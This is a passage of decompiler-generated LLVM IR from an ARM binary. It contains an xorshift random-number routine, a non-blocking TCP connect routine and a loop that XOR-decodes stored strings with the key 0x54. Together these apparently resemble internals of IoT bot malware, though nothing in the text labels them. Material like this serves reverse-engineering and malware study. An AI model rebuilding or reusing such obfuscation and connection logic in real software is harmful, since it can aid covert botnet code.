  %v1_e228 = call i32 @function_fcc0(i32 31)
  store i32 %v3_e178, i32* @r4, align 4
  store i32 %v6_e178, i32* @r5, align 4
  store i32 %v9_e178, i32* @r6, align 4
  store i32 %v12_e178, i32* @r7, align 4
  ret i32 %v1_e228

; uselistorder directives
  uselistorder i32 %v2_e1c8, { 1, 0 }
  uselistorder i32 %v2_e1c4, { 1, 0, 2 }
}

define i32 @function_e248(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e248:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e248 = load i32, i32* %r1.global-to-local, align 4
  %v3_e24c = load i32, i32* @r4, align 4
  store i32 %v3_e24c, i32* %stack_var_-28, align 4
  %v0_e250 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e250, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e248, 1
  br i1 %tmp16, label %dec_label_pc_e2f8, label %dec_label_pc_e258

dec_label_pc_e258:                                ; preds = %dec_label_pc_e248
  store i32 ptrtoint (i32* @global_var_1e9e0.103 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9dc.107 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9d8.105 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e9d4.101 to i32), i32* %r6.global-to-local, align 4
  %v2_e268 = load i32, i32* @global_var_1e9e0.103, align 4
  store i32 %v2_e268, i32* %lr.global-to-local, align 4
  %v2_e26c = load i32, i32* @global_var_1e9dc.107, align 4
  store i32 %v2_e26c, i32* %r4.global-to-local, align 4
  %v2_e270 = load i32, i32* @global_var_1e9d8.105, align 4
  store i32 %v2_e270, i32* %r0.global-to-local, align 4
  %v2_e274 = load i32, i32* @global_var_1e9d4.101, align 4
  br label %dec_label_pc_e298

dec_label_pc_e27c:                                ; preds = %dec_label_pc_e2b8
  %v1_e27c = trunc i32 %v5_e2a8 to i16
  %v3_e27c = inttoptr i32 %v9_e2ac to i16*
  store i16 %v1_e27c, i16* %v3_e27c, align 2
  %v4_e27c = load i32, i32* %r5.global-to-local, align 4
  %v5_e27c = add i32 %v4_e27c, -2
  store i32 %v5_e27c, i32* %r5.global-to-local, align 4
  %v0_e280.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e280

dec_label_pc_e280:                                ; preds = %.thread, %dec_label_pc_e27c
  %v0_e280 = phi i32 [ %v9_e2b0, %.thread ], [ %v0_e280.pre, %dec_label_pc_e27c ]
  %v2_e27c5 = phi i32 [ %v12_e2ac, %.thread ], [ %v5_e27c, %dec_label_pc_e27c ]
  %tmp17 = icmp slt i32 %v0_e280, 1
  br i1 %tmp17, label %dec_label_pc_e300, label %dec_label_pc_e28c

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e280
  %v0_e284 = load i32, i32* %r0.global-to-local, align 4
  %v0_e28c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e28c, i32* %r0.global-to-local, align 4
  %v0_e290 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e290, i32* %r4.global-to-local, align 4
  %v0_e294 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e294, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e298

dec_label_pc_e298:                                ; preds = %dec_label_pc_e258, %dec_label_pc_e28c
  %v0_e2e4 = phi i32 [ %v2_e270, %dec_label_pc_e258 ], [ %v0_e28c, %dec_label_pc_e28c ]
  %v9_e2ac = phi i32 [ %v0_e250, %dec_label_pc_e258 ], [ %v2_e27c5, %dec_label_pc_e28c ]
  %v0_e2c4 = phi i32 [ %v0_e248, %dec_label_pc_e258 ], [ %v0_e280, %dec_label_pc_e28c ]
  %v0_e2d8 = phi i32 [ %v2_e268, %dec_label_pc_e258 ], [ %v0_e294, %dec_label_pc_e28c ]
  %v0_e2d4 = phi i32 [ %v2_e274, %dec_label_pc_e258 ], [ %v0_e284, %dec_label_pc_e28c ]
  %v4_e298 = mul i32 %v0_e2d4, 2048
  %v5_e298 = xor i32 %v4_e298, %v0_e2d4
  %v4_e29c = udiv i32 %v0_e2d8, 524288
  %v5_e29c = xor i32 %v4_e29c, %v0_e2d8
  %v2_e2a0 = xor i32 %v5_e29c, %v5_e298
  %v4_e2a8 = udiv i32 %v5_e298, 256
  %v5_e2a8 = xor i32 %v2_e2a0, %v4_e2a8
  store i32 %v5_e2a8, i32* %r3.global-to-local, align 4
  %v7_e2ac = icmp sgt i32 %v0_e2c4, 3
  br i1 %v7_e2ac, label %.thread, label %dec_label_pc_e2b8

.thread:                                          ; preds = %dec_label_pc_e298
  %v10_e2ac = inttoptr i32 %v9_e2ac to i32*
  store i32 %v5_e2a8, i32* %v10_e2ac, align 4
  %v11_e2ac = load i32, i32* %r5.global-to-local, align 4
  %v12_e2ac = add i32 %v11_e2ac, 4
  store i32 %v12_e2ac, i32* %r5.global-to-local, align 4
  %v8_e2b0 = load i32, i32* %r1.global-to-local, align 4
  %v9_e2b0 = add i32 %v8_e2b0, -4
  store i32 %v9_e2b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e280

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e298
  %v7_e2c4 = icmp eq i32 %v0_e2c4, 1
  store i32 %v5_e2a8, i32* %r3.global-to-local, align 4
  %v1_e2cc = add i32 %v0_e2c4, -2
  store i32 %v1_e2cc, i32* %r1.global-to-local, align 4
  br i1 %v7_e2c4, label %dec_label_pc_e2d4, label %dec_label_pc_e27c

dec_label_pc_e2d4:                                ; preds = %dec_label_pc_e2b8
  store i32 %v5_e2a8, i32* %r3.global-to-local, align 4
  %v1_e2e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e2e4 = inttoptr i32 %v1_e2e4 to i32*
  store i32 %v0_e2e4, i32* %v2_e2e4, align 4
  %v0_e2e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_e2e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_e2e8 = inttoptr i32 %v1_e2e8 to i32*
  store i32 %v0_e2e8, i32* %v2_e2e8, align 4
  %v0_e2ec = load i32, i32* %lr.global-to-local, align 4
  %v1_e2ec = load i32, i32* %r8.global-to-local, align 4
  %v2_e2ec = inttoptr i32 %v1_e2ec to i32*
  store i32 %v0_e2ec, i32* %v2_e2ec, align 4
  %v0_e2f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2f0 = load i32, i32* %sl.global-to-local, align 4
  %v2_e2f0 = inttoptr i32 %v1_e2f0 to i32*
  store i32 %v0_e2f0, i32* %v2_e2f0, align 4
  %v0_e2f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2f4 = trunc i32 %v0_e2f4 to i8
  %v2_e2f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_e2f4 = inttoptr i32 %v2_e2f4 to i8*
  store i8 %v1_e2f4, i8* %v3_e2f4, align 1
  br label %dec_label_pc_e2f8

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e248, %dec_label_pc_e300, %dec_label_pc_e2d4
  %v2_e2f8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e2f8, i32* @r4, align 4
  %v1_e2fc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e2fc

dec_label_pc_e300:                                ; preds = %dec_label_pc_e280
  %v0_e300 = load i32, i32* %r3.global-to-local, align 4
  %v1_e300 = load i32, i32* %sl.global-to-local, align 4
  %v2_e300 = inttoptr i32 %v1_e300 to i32*
  store i32 %v0_e300, i32* %v2_e300, align 4
  %v0_e304 = load i32, i32* %lr.global-to-local, align 4
  %v1_e304 = load i32, i32* %r8.global-to-local, align 4
  %v2_e304 = inttoptr i32 %v1_e304 to i32*
  store i32 %v0_e304, i32* %v2_e304, align 4
  %v0_e308 = load i32, i32* %r4.global-to-local, align 4
  %v1_e308 = load i32, i32* %r7.global-to-local, align 4
  %v2_e308 = inttoptr i32 %v1_e308 to i32*
  store i32 %v0_e308, i32* %v2_e308, align 4
  %v0_e30c = load i32, i32* %r0.global-to-local, align 4
  %v1_e30c = load i32, i32* %r6.global-to-local, align 4
  %v2_e30c = inttoptr i32 %v1_e30c to i32*
  store i32 %v0_e30c, i32* %v2_e30c, align 4
  br label %dec_label_pc_e2f8

; uselistorder directives
  uselistorder i32 %v9_e2b0, { 1, 0 }
  uselistorder i32 %v12_e2ac, { 1, 0 }
  uselistorder i32 %v5_e2a8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e2d4, { 1, 0 }
  uselistorder i32 %v0_e2d8, { 1, 0 }
  uselistorder i32 %v0_e2c4, { 1, 0, 2 }
  uselistorder i32 %v0_e280, { 1, 0 }
  uselistorder i32 %v0_e248, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1e9d4.101, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1e9d4.101 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_1e9d8.105, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_1e9dc.107, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1e9e0.103, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e2f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e298, { 1, 0 }
}

define i32 @function_e324() local_unnamed_addr {
dec_label_pc_e324:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e324 = load i32, i32* @r4, align 4
  store i32 %v3_e324, i32* %stack_var_-16, align 4
  %v12_e324 = load i32, i32* @lr, align 4
  %v0_e328 = load i32, i32* @r0, align 4
  store i32 %v0_e328, i32* %r5.global-to-local, align 4
  %v1_e32c = add i32 %v0_e328, 4
  %v2_e32c = inttoptr i32 %v1_e32c to i32*
  %v3_e32c = load i32, i32* %v2_e32c, align 4
  store i32 %v3_e32c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 58192, i32* @lr, align 4
  %v1_e34c = icmp ne i32 %v3_e32c, -1
  call void @__pseudo_cond_branch(i1 %v1_e34c, i32 ptrtoint (i32* @global_var_10dd8.95 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e35c = call i32 @function_115e4(i32 2, i32 1, i32 0)
  store i32 %v3_e35c, i32* %r0.global-to-local, align 4
  %v7_e360 = icmp eq i32 %v3_e35c, -1
  %v1_e364 = load i32, i32* %r5.global-to-local, align 4
  %v2_e364 = add i32 %v1_e364, 4
  %v3_e364 = inttoptr i32 %v2_e364 to i32*
  store i32 %v3_e35c, i32* %v3_e364, align 4
  br i1 %v7_e360, label %dec_label_pc_e324.dec_label_pc_e3dc_crit_edge, label %dec_label_pc_e36c

dec_label_pc_e324.dec_label_pc_e3dc_crit_edge:    ; preds = %dec_label_pc_e324
  %v1_e3e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3dc

dec_label_pc_e36c:                                ; preds = %dec_label_pc_e324
  %v2_e330 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e36c = load i32, i32* %r5.global-to-local, align 4
  %v1_e36c = add i32 %v0_e36c, 28
  store i32 %v1_e36c, i32* @r0, align 4
  %v0_e370 = load i32, i32* %r6.global-to-local, align 4
  %v2_e370 = add i32 %v0_e36c, 24
  %v3_e370 = inttoptr i32 %v2_e370 to i32*
  store i32 %v0_e370, i32* %v3_e370, align 4
  store i32 256, i32* @r1, align 4
  %v0_e378 = call i32 @function_103ac()
  store i32 %v0_e378, i32* %r0.global-to-local, align 4
  %v0_e37c = load i32, i32* %r5.global-to-local, align 4
  %v1_e37c = add i32 %v0_e37c, 4
  %v2_e37c = inttoptr i32 %v1_e37c to i32*
  %v3_e37c = load i32, i32* %v2_e37c, align 4
  store i32 %v3_e37c, i32* %r4.global-to-local, align 4
  %v0_e380 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_e380, i32* %r2.global-to-local, align 4
  store i32 %v3_e37c, i32* %r0.global-to-local, align 4
  %v2_e38c = call i32 @function_10c0c(i32 %v3_e37c, i32 3)
  %v1_e394 = or i32 %v2_e38c, 2048
  store i32 %v1_e394, i32* %r2.global-to-local, align 4
  %v0_e398 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e398, i32* %r0.global-to-local, align 4
  %v2_e39c = call i32 @function_10c0c(i32 %v0_e398, i32 4)
  store i32 %v2_e39c, i32* %r0.global-to-local, align 4
  %v2_e3a4 = load i32, i32* @global_var_1ea18.121, align 4
  store i32 %v2_e3a4, i32* %r2.global-to-local, align 4
  %v1_e3ac = load i32, i32* %r5.global-to-local, align 4
  %v2_e3ac = add i32 %v1_e3ac, 12
  %v3_e3ac = inttoptr i32 %v2_e3ac to i32*
  store i32 1, i32* %v3_e3ac, align 4
  store i32 2, i32* @r3, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e3b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e3b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_e3b8 = add i32 %v1_e3b8, 8
  %v3_e3b8 = inttoptr i32 %v2_e3b8 to i32*
  store i32 %v0_e3b8, i32* %v3_e3b8, align 4
  %v0_e3bc = load i32, i32* %r5.global-to-local, align 4
  %v1_e3bc = add i32 %v0_e3bc, 16
  %v2_e3bc = inttoptr i32 %v1_e3bc to i32*
  %v3_e3bc = load i32, i32* %v2_e3bc, align 4
  store i32 %v3_e3bc, i32* @ip, align 4
  %v1_e3c0 = add i32 %v0_e3bc, 4
  %v2_e3c0 = inttoptr i32 %v1_e3c0 to i32*
  %v3_e3c0 = load i32, i32* %v2_e3c0, align 4
  store i32 %v3_e3c0, i32* %r0.global-to-local, align 4
  %v1_e3c4 = add i32 %v0_e3bc, 20
  %v2_e3c4 = inttoptr i32 %v1_e3c4 to i16*
  %v3_e3c4 = load i16, i16* %v2_e3c4, align 2
  %v4_e3c4 = zext i16 %v3_e3c4 to i32
  store i32 %v4_e3c4, i32* %r5.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e3d8 = call i32 @function_113cc(i32 %v3_e3c0, i32 %v2_e330, i32 16)
  store i32 %v3_e3d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3dc

dec_label_pc_e3dc:                                ; preds = %dec_label_pc_e324.dec_label_pc_e3dc_crit_edge, %dec_label_pc_e36c
  %v1_e3e4 = phi i32 [ %v1_e3e4.pre, %dec_label_pc_e324.dec_label_pc_e3dc_crit_edge ], [ %v3_e3d8, %dec_label_pc_e36c ]
  %v2_e3e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e3e0, i32* @r4, align 4
  store i32 %v12_e324, i32* @lr, align 4
  ret i32 %v1_e3e4

; uselistorder directives
  uselistorder i32 %v3_e35c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @function_103ac, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e3dc, { 1, 0 }
}

define i32 @function_e3ec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e3ec:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_e3ec = load i32, i32* @r4, align 4
  %v6_e3ec = load i32, i32* @r5, align 4
  %v9_e3ec = load i32, i32* @r6, align 4
  %v12_e3ec = load i32, i32* @r7, align 4
  %v15_e3ec = load i32, i32* @r8, align 4
  %v18_e3ec = load i32, i32* @sb, align 4
  %v21_e3ec = load i32, i32* @sl, align 4
  %v24_e3ec = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_1e9e4.123 to i32), i32* @fp, align 4
  %v2_e3f4 = load i32, i32* @global_var_1e9e4.123, align 4
  store i32 ptrtoint (i32* @global_var_1ea10.125 to i32), i32* @sl, align 4
  %v1_e400 = add i32 %v2_e3f4, 1
  store i32 %v1_e400, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_e40c = load i32, i32* @global_var_1ea10.125, align 4
  store i32 %v2_e40c, i32* %r0.global-to-local, align 4
  %v3_e410 = mul i32 %v1_e400, 16
  store i32 %v3_e410, i32* %r1.global-to-local, align 4
  %v4_e418 = inttoptr i32 %v2_e40c to i32*
  %v5_e418 = call i32 @function_12280(i32* %v4_e418, i32 %v3_e410, i32 %arg3, i32 %v1_e400)
  %v2_e41c = load i32, i32* @global_var_1e9e4.123, align 4
  store i32 %v2_e41c, i32* %r2.global-to-local, align 4
  store i32 %v5_e418, i32* @r8, align 4
  %v0_e424 = load i32, i32* @r5, align 4
  store i32 %v0_e424, i32* %r0.global-to-local, align 4
  %v1_e42c = load i32, i32* @sl, align 4
  %v2_e42c = inttoptr i32 %v1_e42c to i32*
  store i32 %v5_e418, i32* %v2_e42c, align 4
  %v1_e430 = inttoptr i32 %v0_e424 to i8*
  %v2_e430 = call i32 @function_10318(i8* %v1_e430)
  %sext = mul i32 %v2_e430, 16777216
  %v1_e434 = sdiv i32 %sext, 16777216
  %v2_e434 = add nsw i32 %v1_e434, 1
  store i32 %v2_e434, i32* @r4, align 4
  store i32 %v1_e434, i32* @r7, align 4
  store i32 %v2_e434, i32* @r0, align 4
  %v0_e440 = call i32 @function_1182c()
  store i32 %v0_e440, i32* %r0.global-to-local, align 4
  %v0_e444 = load i32, i32* @r5, align 4
  store i32 %v0_e444, i32* %r1.global-to-local, align 4
  %v0_e448 = load i32, i32* @r4, align 4
  store i32 %v0_e448, i32* %r2.global-to-local, align 4
  store i32 %v0_e440, i32* %r6.global-to-local, align 4
  %v3_e450 = call i32 @function_10388(i32 %v0_e440, i32 %v0_e444, i32 %v0_e448)
  store i32 %v3_e450, i32* %r0.global-to-local, align 4
  %v0_e454 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_e454, 1
  %extract.t6 = trunc i32 %v0_e454 to i8
  br i1 %tmp22, label %dec_label_pc_e478, label %dec_label_pc_e45c

dec_label_pc_e45c:                                ; preds = %dec_label_pc_e3ec
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e460

dec_label_pc_e460:                                ; preds = %dec_label_pc_e460, %dec_label_pc_e45c
  %v2_e468 = phi i32 [ %v1_e46c, %dec_label_pc_e460 ], [ 0, %dec_label_pc_e45c ]
  %v1_e460 = load i32, i32* %r6.global-to-local, align 4
  %v2_e460 = add i32 %v1_e460, %v2_e468
  %v3_e460 = inttoptr i32 %v2_e460 to i8*
  %v4_e460 = load i8, i8* %v3_e460, align 1
  %v6_e460 = zext i8 %v4_e460 to i32
  %v1_e464 = xor i32 %v6_e460, 84
  store i32 %v1_e464, i32* %r3.global-to-local, align 4
  %v1_e468 = trunc i32 %v1_e464 to i8
  store i8 %v1_e468, i8* %v3_e460, align 1
  %v0_e46c = load i32, i32* %r2.global-to-local, align 4
  %v1_e46c = add i32 %v0_e46c, 1
  store i32 %v1_e46c, i32* %r2.global-to-local, align 4
  %v1_e470 = load i32, i32* @r7, align 4
  %v9_e470 = icmp eq i32 %v1_e46c, %v1_e470
  br i1 %v9_e470, label %dec_label_pc_e478.loopexit, label %dec_label_pc_e460

dec_label_pc_e478.loopexit:                       ; preds = %dec_label_pc_e460
  %extract.t = trunc i32 %v1_e46c to i8
  br label %dec_label_pc_e478

dec_label_pc_e478:                                ; preds = %dec_label_pc_e478.loopexit, %dec_label_pc_e3ec
  %v0_e488.off0 = phi i8 [ %extract.t, %dec_label_pc_e478.loopexit ], [ %extract.t6, %dec_label_pc_e3ec ]
  %v2_e478 = load i32, i32* @global_var_1e9e4.123, align 4
  %v2_e47c = load i32, i32* @global_var_1ea10.125, align 4
  %v3_e480 = mul i32 %v2_e478, 16
  store i32 %v3_e480, i32* @sb, align 4
  %v2_e484 = add i32 %v2_e47c, %v3_e480
  store i32 %v2_e484, i32* %r2.global-to-local, align 4
  %v3_e488 = add i32 %v2_e484, 12
  %v4_e488 = inttoptr i32 %v3_e488 to i8*
  store i8 %v0_e488.off0, i8* %v4_e488, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_e41c, i32* %r3.global-to-local, align 4
  %v0_e494 = load i32, i32* %r6.global-to-local, align 4
  %v1_e494 = load i32, i32* @r8, align 4
  %v5_e494 = mul i32 %v2_e41c, 16
  %v6_e494 = add i32 %v1_e494, %v5_e494
  %v7_e494 = inttoptr i32 %v6_e494 to i32*
  store i32 %v0_e494, i32* %v7_e494, align 4
  %v2_e498 = load i32, i32* @global_var_1ea10.125, align 4
  store i32 %v2_e498, i32* @r7, align 4
  %v1_e49c = inttoptr i32 %arg2 to i8*
  %v2_e49c = call i32 @function_10318(i8* %v1_e49c)
  %sext1 = mul i32 %v2_e49c, 16777216
  %v1_e4a0 = sdiv i32 %sext1, 16777216
  %v2_e4a0 = add nsw i32 %v1_e4a0, 1
  store i32 %v2_e4a0, i32* @r4, align 4
  store i32 %v1_e4a0, i32* @r6, align 4
  store i32 %v2_e4a0, i32* @r0, align 4
  %v0_e4ac = call i32 @function_1182c()
  store i32 %v0_e4ac, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_e4b4 = load i32, i32* @r4, align 4
  store i32 %v0_e4b4, i32* %r2.global-to-local, align 4
  store i32 %v0_e4ac, i32* %r5.global-to-local, align 4
  %v3_e4bc = call i32 @function_10388(i32 %v0_e4ac, i32 %arg2, i32 %v0_e4b4)
  store i32 %v3_e4bc, i32* %r0.global-to-local, align 4
  %v0_e4c0 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_e4c0, 1
  %extract.t8 = trunc i32 %v0_e4c0 to i8
  br i1 %tmp23, label %dec_label_pc_e4e4, label %dec_label_pc_e4c8

dec_label_pc_e4c8:                                ; preds = %dec_label_pc_e478
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e4cc

dec_label_pc_e4cc:                                ; preds = %dec_label_pc_e4cc, %dec_label_pc_e4c8
  %v2_e4d4 = phi i32 [ %v1_e4d8, %dec_label_pc_e4cc ], [ 0, %dec_label_pc_e4c8 ]
  %v1_e4cc = load i32, i32* %r5.global-to-local, align 4
  %v2_e4cc = add i32 %v1_e4cc, %v2_e4d4
  %v3_e4cc = inttoptr i32 %v2_e4cc to i8*
  %v4_e4cc = load i8, i8* %v3_e4cc, align 1
  %v6_e4cc = zext i8 %v4_e4cc to i32
  %v1_e4d0 = xor i32 %v6_e4cc, 84
  store i32 %v1_e4d0, i32* %r3.global-to-local, align 4
  %v1_e4d4 = trunc i32 %v1_e4d0 to i8
  store i8 %v1_e4d4, i8* %v3_e4cc, align 1
  %v0_e4d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e4d8 = add i32 %v0_e4d8, 1
  store i32 %v1_e4d8, i32* %r2.global-to-local, align 4
  %v1_e4dc = load i32, i32* @r6, align 4
  %v9_e4dc = icmp eq i32 %v1_e4d8, %v1_e4dc
  br i1 %v9_e4dc, label %dec_label_pc_e4e4.loopexit, label %dec_label_pc_e4cc

dec_label_pc_e4e4.loopexit:                       ; preds = %dec_label_pc_e4cc
  %extract.t7 = trunc i32 %v1_e4d8 to i8
  br label %dec_label_pc_e4e4

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e4e4.loopexit, %dec_label_pc_e478
  %v0_e4f4.off0 = phi i8 [ %extract.t7, %dec_label_pc_e4e4.loopexit ], [ %extract.t8, %dec_label_pc_e478 ]
  %v2_e4e4 = load i32, i32* @global_var_1e9e4.123, align 4
  store i32 %v2_e4e4, i32* %r0.global-to-local, align 4
  %v2_e4e8 = load i32, i32* @global_var_1ea10.125, align 4
  %v3_e4ec = mul i32 %v2_e4e4, 16
  store i32 %v3_e4ec, i32* %r1.global-to-local, align 4
  %v2_e4f0 = or i32 %v3_e4ec, 13
  %v3_e4f4 = add i32 %v2_e4f0, %v2_e4e8
  %v4_e4f4 = inttoptr i32 %v3_e4f4 to i8*
  store i8 %v0_e4f4.off0, i8* %v4_e4f4, align 1
  store i32 ptrtoint (i16** @global_var_1ea14.127 to i32), i32* %r4.global-to-local, align 4
  %v2_e500 = load i16, i16* bitcast (i16** @global_var_1ea14.127 to i16*), align 4
  %v3_e500 = zext i16 %v2_e500 to i32
  store i32 %v3_e500, i32* %lr.global-to-local, align 4
  %v2_e508 = load i32, i32* @global_var_1ea10.125, align 4
  store i32 %v2_e508, i32* %r2.global-to-local, align 4
  %v0_e510 = load i32, i32* %r1.global-to-local, align 4
  %v2_e510 = add i32 %v0_e510, %v2_e508
  store i32 %v2_e510, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_1ea14.127 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_e518 = load i32, i32* @sb, align 4
  %v1_e518 = load i32, i32* @r7, align 4
  %v2_e518 = add i32 %v1_e518, %v0_e518
  store i32 %v2_e518, i32* %ip.global-to-local, align 4
  %v0_e51c = load i32, i32* %r0.global-to-local, align 4
  %v1_e51c = add i32 %v0_e51c, 1
  store i32 %v1_e51c, i32* %r0.global-to-local, align 4
  %v3_e520 = add i32 %v2_e510, 10
  %v4_e520 = inttoptr i32 %v3_e520 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_1ea14.127 to i32), i32 16), i32 16) to i16), i16* %v4_e520, align 2
  %v0_e524 = load i32, i32* %lr.global-to-local, align 4
  %v1_e524 = trunc i32 %v0_e524 to i16
  %v2_e524 = load i32, i32* %r1.global-to-local, align 4
  %v3_e524 = add i32 %v2_e524, 8
  %v4_e524 = inttoptr i32 %v3_e524 to i16*
  store i16 %v1_e524, i16* %v4_e524, align 2
  %v0_e528 = load i32, i32* %r5.global-to-local, align 4
  %v1_e528 = load i32, i32* %ip.global-to-local, align 4
  %v2_e528 = add i32 %v1_e528, 4
  %v3_e528 = inttoptr i32 %v2_e528 to i32*
  store i32 %v0_e528, i32* %v3_e528, align 4
  %v1_e52c = load i32, i32* @fp, align 4
  %v2_e52c = inttoptr i32 %v1_e52c to i32*
  store i32 %v1_e51c, i32* %v2_e52c, align 4
  %v0_e530 = load i32, i32* %r3.global-to-local, align 4
  %v1_e530 = trunc i32 %v0_e530 to i16
  %v2_e530 = load i32, i32* %r4.global-to-local, align 4
  %v3_e530 = inttoptr i32 %v2_e530 to i16*
  store i16 %v1_e530, i16* %v3_e530, align 2
  store i32 %v3_e3ec, i32* @r4, align 4
  store i32 %v6_e3ec, i32* @r5, align 4
  store i32 %v9_e3ec, i32* @r6, align 4
  store i32 %v12_e3ec, i32* @r7, align 4
  store i32 %v15_e3ec, i32* @r8, align 4
  store i32 %v18_e3ec, i32* @sb, align 4
  store i32 %v21_e3ec, i32* @sl, align 4
  store i32 %v24_e3ec, i32* @fp, align 4
  ret i32 %v1_e51c

; uselistorder directives
  uselistorder i32 %v3_e4ec, { 1, 0 }
  uselistorder i32 %v1_e4d8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e4ac, { 1, 0, 2 }
  uselistorder i32 %v3_e480, { 1, 0 }
  uselistorder i32 %v1_e46c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e440, { 1, 0, 2 }
  uselistorder i32 %v2_e41c, { 1, 0, 2 }
  uselistorder i32 %v3_e410, { 1, 0 }
  uselistorder i32 %v1_e400, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
